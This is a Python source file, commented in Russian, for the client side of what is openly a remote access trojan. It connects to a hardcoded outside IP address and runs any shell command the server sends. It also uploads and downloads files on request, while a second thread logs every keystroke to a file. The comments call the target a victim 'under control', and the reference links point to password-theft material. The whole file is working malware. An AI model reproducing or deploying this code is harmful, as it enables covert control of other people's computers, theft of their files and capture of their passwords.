import socket
import time
import datetime
import threading
import os
import subprocess
from pynput.keyboard import Listener

"""
Также как и на серверной стороне, здесь будут фигурировать внутренние локальные IP, которые 
можно посмотреть в ipconfig в cmd.
Далее и на клиентской стороне сперва надо создать сокет. 
"""


# две функции ниже это key логгеры
def write(key):
    now = datetime.datetime.now()
    current_time = now.strftime("%D:%H:%M:%S")
    keydata = str(key)
    #print(keydata)
    # keydata.replace("'", " ") '''123```
    with open("keylog.txt", "a") as f:
        f.write(keydata)
        f.write("   |")
        f.write(current_time)
        f.write("\n")


def start_logger():
    # очень странный механизм запуска но тем не менее
    with Listener(on_press=write) as l:
        l.join()


def despatch(ip, port, message):
    """
    Обычная функция которая принимает айпи, порт и сообщение и шлет на сервер
    """
    # UDP протокол
    # s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # s.sendto(b'Artem', ('127.0.0.1', 8888))

    # TCP протокол
    # можно также оставить скубки пустыми и будет все работать
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # прописываем куда будем делать коннект, адрес сервера и порт на котором он слушает
    sock.connect((ip, int(port)))

    # далее всегда надо шифровать в байты перед посылкой, иначе ошибки
    # для отправки используем метод сокета send.
    sock.send((f'{message}').encode())

    # после того как мы что то послали, мы можем получить ответ через метод recv (как и на сервере)
    # эту строку надо убрать если мы ничего от сервера не получаем, иначе повиснет
    data = sock.recv(1024)
    # и посмотреть дату через принт
    print(data.decode())

    # дальше всегда закрываем соединение
    sock.close()


def accept_attack(ip="109.237.25.179", port="9090"):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, int(port)))
    # дописать в лог айпи атакованной машины и ее порт
    # sock.send(("The pc is under control").encode())

    # как только жертва под контролем начинаем писать лог нажатий
    # на текущем этапе не работает, запускать в соседнем треде, что бы основной не блокировался
    # start_logger()

    while True:
        data = sock.recv(1024)
        print(data.decode(), ": incoming answer from server")
        if data.decode() == "quit":
            break
        # у пустой строки длинна равна 1, поэтому 1 наша точка отсчета
        if len(data) > 1:
            if data[:2].decode() == "cd":
                try:
                    os.chdir(data[3:].decode())
                    # сервер всегда ждет ответ, если не слать ничего и пропустить шаг ниже - сервер повиснет
                    # шлем текущую директорию в которую мы перешли
                    sock.send(os.getcwd().encode())
                except Exception as e:
                    print(e)
            elif data[:4].decode() == "send":
                #если была команда SEND, готовим клиент к получению файла с сервера
                command, file_name = data.decode().split(" ")

                op = open(file_name, 'wb')
                while True:
                    #принимаем бесконечно файл с сервера, выход по флашу финиша
                    data = sock.recv(1024)
                    if data == b"finish":
                        break
                    op.write(data)
                op.close()
                print(f"Файл {file_name} получен успешно")

            elif data[:3].decode() == "get":
                #если была команда GET, тогда готовим клиент к загрузки файла на сервер
                try:
                    #распарсим команду, вытащим из нее название
                    command, file_name = data.decode().split(" ")

                    op = open(file_name, 'rb')
                    while True:
                        data = op.read(1024)
                        if not data:
                            #если дата пустая строка, тогда выходим с цикла
                            #очень важно дать поспать, что бы сервер успех сохранить то что ему послали ранее и услышать ответ
                            time.sleep(1)
                            break
                        sock.send(data)
                    #в конце по выходу из цикла говорим серверу что мы закончили, что бы он тоже вышел из цикла
                    sock.send(b"finish")
                    #файл надо всегда закрывать в конце
                    op.close()
                    print(f"Файл {file_name} отправлен успешно")
                except Exception as e:
                    #если были ошибки то возвращаем их серверу
                    print(f"При загрузке файла {file_name} на сервер произошла ошибка: {e}")
                    sock.send((f"ERROR: При загрузке файла {file_name} на сервер произошла ошибка: {e}").encode())
            else:
                # далее открывается shell и запускаются команды, Popen берет строку, поэтому конвертим
                # шел указываем True (хз пока зачем), может быть даем видеть атакуемому командную строку.
                # и в стдартном вводе, выводе, ошибке пишем subprocess.PIPE (наверное для конвертации всего в строку)
                cmd = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                # далее пишем ответ консоли в перменную (не конвертируем так как ответ в байтах, и слать тоже надо байты)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                # на всякий случай заимеем ответ также в виде строки
                output_string = str(output_bytes, "cp866")

                sock.send(output_bytes)
        else:
            sock.send(b"empty string response")
            print("Послали ответ на пустую строку")
    sock.close()



if __name__ == '__main__':
    threadOne = threading.Thread(target=accept_attack, name="start getting requests")
    threadTwo = threading.Thread(target=start_logger, name="start key logging")
    threadOne.start()
    threadTwo.start()
    threadOne.join()
    threadTwo.join()


"""
Полезные ссылки:
https://hackware.ru/?p=11350
https://habr.com/ru/post/134982/
https://habr.com/ru/post/312470/
https://xakep.ru/2016/04/25/passwords-leaks/
https://forums.tomshardware.com/threads/can-i-delete-this-folder.2277419/
https://www.passcape.com/windows_password_recovery_dpapi_decoder_rus#:~:text=%D0%9C%D0%B0%D1%81%D1%82%D0%B5%D1%80%20%D0%9A%D0%BB%D1%8E%D1%87%20%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D1%82%D0%B5%D0%BB%D1%8F%20%D0%B2%D1%81%D0%B5%D0%B3%D0%B4%D0%B0%20%D1%80%D0%B0%D1%81%D0%BF%D0%BE%D0%BB%D0%B0%D0%B3%D0%B0%D0%B5%D1%82%D1%81%D1%8F,%25SYSTEMDIR%25%5CMicrosoft%5CProtect.
https://habr.com/ru/post/434514/
https://www.sql.ru/forum/630247/kak-skopirovat-fayl-papki-s-udalennogo-komputera-s-pomoshhu-cmd
"""